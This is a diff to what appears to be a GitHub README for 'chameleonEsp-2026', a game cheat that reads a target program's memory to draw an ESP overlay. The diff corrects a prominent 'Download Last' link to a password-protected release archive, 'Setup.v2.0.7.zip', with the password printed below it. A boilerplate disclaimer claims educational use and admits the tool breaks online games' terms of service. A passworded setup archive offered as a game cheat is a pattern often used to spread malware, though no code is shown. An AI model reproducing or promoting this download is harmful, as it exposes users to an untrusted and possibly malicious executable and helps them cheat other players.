@@ -2,7 +2,7 @@
 
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2b22d6e4-2587-4bf5-acd5-97d0b6746eb5" />
 
-[Download Last]([https://github.com/Plota-cloud/chameleonEsp-2026/tree/main](https://github.com/Plota-cloud/chameleonEsp-2026/releases/download/tags/Setup.v2.0.7.zip))
+[Download Last](https://github.com/Plota-cloud/chameleonEsp-2026/releases/download/tags/Setup.v2.0.7.zip)
 
 pass: pro2026
 
@@ -46,6 +46,8 @@ All memory reads are read‑only — no values are written back to the target pr
 This software is intended solely for educational and research purposes — including but not limited to security analysis, performance profiling, and reverse engineering under controlled conditions.
 Unauthorized use of external tools in online multiplayer environments may violate the target application's Terms of Service and can lead to penalties, including account suspension or permanent bans.
 The authors assume no liability for any damages, loss of access, or legal consequences arising from improper or malicious use. Users are responsible for ensuring compliance with all applicable laws and platform policies.
+
+
 
 ## Use at your own risk.
 Target application running in windowed or borderless windowed mode (for overlay compositing)
